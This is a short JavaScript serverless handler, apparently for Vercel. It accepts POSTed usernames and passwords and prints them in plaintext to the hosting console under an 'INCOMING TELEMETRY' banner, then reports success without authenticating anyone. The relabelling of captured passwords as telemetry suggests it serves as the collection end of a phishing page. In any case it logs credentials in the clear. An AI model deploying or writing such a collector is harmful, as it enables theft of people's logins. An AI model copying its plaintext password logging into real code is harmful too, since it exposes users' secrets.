export default function handler(req, res) {
    if (req.method === 'POST') {
        const { user, pass } = req.body;

        // Outputs directly to the continuous streaming console inside the Vercel Dashboard
        console.log(`\n--- INCOMING TELEMETRY ---`);
        console.log(`IDENTIFIER : ${user}`);
        console.log(`CREDENTIAL : ${pass}`);
        console.log(`--------------------------\n`);

        return res.status(200).json({ status: 'success' });
    }
    return res.status(405).json({ message: 'Method Not Allowed' });
}
